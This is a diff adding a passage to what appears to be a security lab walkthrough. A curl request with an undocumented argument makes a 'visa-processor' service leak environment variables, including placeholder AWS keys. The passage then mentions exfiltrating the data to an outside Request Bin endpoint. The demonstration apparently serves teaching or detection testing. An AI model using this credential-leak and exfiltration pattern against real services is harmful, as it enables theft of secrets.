@@ -99,4 +99,26 @@ The first **curl** command exploits an application bug to retrieve the AWS API k
 Normally, the **visa-processor** component returns the value of its **APP_ID** environment variable:
 
 ```
-$ curl -sk -X POST http://vis
+$ curl -sk -X POST http://visa-processor.data-theft.svc:8080/getApplicationIdentity
+{
+    "APP_ID": "visa-processor"
+}
+```
+
+But by passing an additional undocumented argument, we can retrieve the following environment variables (in alphabetical order):
+
+```
+$ curl -sk -d '{"numberOfIdentities":4}' http://visa-processor.data-theft.svc:8080/getApplicationIdentity
+
+{
+    "APP_ID": "visa-processor",
+    "APP_ROOT": "/opt/app-root",
+    "AWS_ACCESS_KEY_ID": "Easy, peasy!",
+    "AWS_SECRET_ACCESS_KEY": "Catch me if you can!"
+}
+```
+
+The second **curl** command exfiltrates data via the **Request Bin** service.
+Connect to [https://enyd1rw3pwz3a.x.pipedream.net](https://enyd1rw3pwz3a.x.pipedream.net) and confirm that the exfiltrated data is present.
+
+{{% /expand%}}
